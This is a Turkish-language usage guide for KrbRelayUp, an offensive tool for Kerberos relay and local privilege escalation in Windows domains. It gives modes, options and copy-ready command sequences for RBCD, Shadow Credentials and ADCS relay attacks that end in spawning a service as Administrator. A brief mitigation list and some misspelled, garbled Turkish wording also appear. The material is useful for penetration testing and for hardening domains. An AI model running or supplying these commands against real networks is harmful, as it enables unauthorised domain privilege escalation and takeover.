# KrbRelayUp.exe Kullanım Kılavuzu

## Hakkında

**KrbRelayUp**, Kerberos protokolünü kullanarak çeşitli zafiyetleri sümültmek için geliştirilmiş bir aracıdır. Bu aracın ana amacı, LDAP imzalama zorunluluğu bulunmayan Windows domain ortamlarında yerel yetki yükseltme saldırıları yapmaktır. 

---

## Özellikler ve Desteklenen Yöntemler

### Desteklenen Saldırı Teknikleri

- **Yeni bilgisayar hesabı oluşturma**
- **Makine hesabı kimlik doğrulama zorlaması (KrbRelay)**
- **LDAP'ı hedef alarak Kerberos relay**
- **RBCD (Resource-Based Constrained Delegation) kullanarak ST (Service Ticket) alımı**
- **Shadow Credentials desteği**
- **ADCS (Active Directory Certificate Services) Web Enrollment Relay**

---

## Kullanım

### Genel Kullanım Formatı

```bash
KrbRelayUp.exe [mod] [opsiyonlar]
```

### Modlar

#### FULL
Komple süreci yürütür. RELAY ve SPAWN işlemlerini birleştirir.

#### RELAY
Kerberos yetkilendirme talebini zorlayarak LDAP'ı hedef alır ve kontrol primi oluşturur.

```bash
KrbRelayUp.exe relay -d domain.local -cn bilgisayarAdi [-c] [-cp parola | -ch NTLMhash]
```

#### SPAWN
Kerberos biletini kullanarak yeni bir hizmet oluşturur.

```bash
KrbRelayUp.exe spawn -d domain.local -cn bilgisayarAdi [-cp parola | -ch NTLMhash] <-i kullanici>
```

#### KRBSCM
Yüklenmiş Kerberos hizmet biletiyle yeni bir hizmet oluşturur.

```bash
KrbRelayUp.exe krbscm <-s servisAdi> <-sc servisKomutu>
```

---

## Opsiyonlar

- `-m` veya `--Method`: Küllanılacak yöntem (varsayılan: rbcd)
- `-p` veya `--Port`: COM sunucusu portu (varsayılan: 12345)
- `-cls` veya `--Clsid`: CLSID (varsayılan: 90f18417-f0f1-484e-9d3c-59dceee5dbd8)
- `-c` veya `--CreateNewComputerAccount`: Yeni bilgisayar hesabı oluştur
- `-cn` veya `--ComputerName`: Bilgisayar adı (varsayılan: KRBRELAYUP$)
- `-cp` veya `--ComputerPassword`: Bilgisayar hesabı parolası (varsayılan: Rastgele)
- `-ch` veya `--ComputerPasswordHash`: NTLM hash
- `-f` veya `--ForceShadowCred`: Shadow Credentials temizleme zorlaması
- `-ca` veya `--CAEndpoint`: CA (Certificate Authority) uç noktası FQDN (varsayılan: DC ile aynı)
- `-https`: HTTPS kullanarak CA'ya bağlan
- `-cet` veya `--CertificateTemplate`: Sertifika şablonu (varsayılan: Machine)
- `-ce` veya `--Certificate`: Sertifika veya sertifika dosyası yolu
- `-cep` veya `--CertificatePassword`: Sertifika parolası

---

## Örnek Kullanımlar

### Yeni Bilgisayar Hesabıyla RBCD Saldırısı

```bash
KrbRelayUp.exe relay -d domain.local -c -cn KRBRELAYUP$ -cp StrongPassword
KrbRelayUp.exe spawn -d domain.local -cn KRBRELAYUP$ -cp StrongPassword -i Administrator
```

### Shadow Credentials ile Saldırı

```bash
KrbRelayUp.exe relay -d domain.local -m shadowcred
KrbRelayUp.exe spawn -d domain.local -m shadowcred -ce cert.pem
```

### ADCS Web Enrollment Relay Kullanımı

```bash
KrbRelayUp.exe relay -d domain.local -ca ca.domain.local -https -cet User
KrbRelayUp.exe spawn -d domain.local -m adcs -ce cert.pem
```

---

## Mitigasyonlar

1. LDAP imzalama ve kanal bağlantı zorlamalarını etkinleştirin.
2. **MS-DS-Machine-Account-Quota** değerini 0 olarak ayarlayarak yeni makine hesaplarının eklenmesini engelleyin.
3. "Hesap hassastır ve devredilemez" bayrağını kritik hesaplar için etkinleştirin.
4. ADCS'de TLS kullanımını zorunlu hale getirin ve Gelişmiş Kimlik Doğrulama Korumasını etkinleştirin.

---

## Katkılar

- **Dec0ne** ve **Cube0x0** çalışmalarından esinlenilmiştir.
- **Rubeus** ve **ADCSPwn** kodlarından bölümler entegre edilmiştir.

---

## Lisans

**KrbRelayUp** aracı, BSD-3-Clause lisansı altında sunulmaktadır.
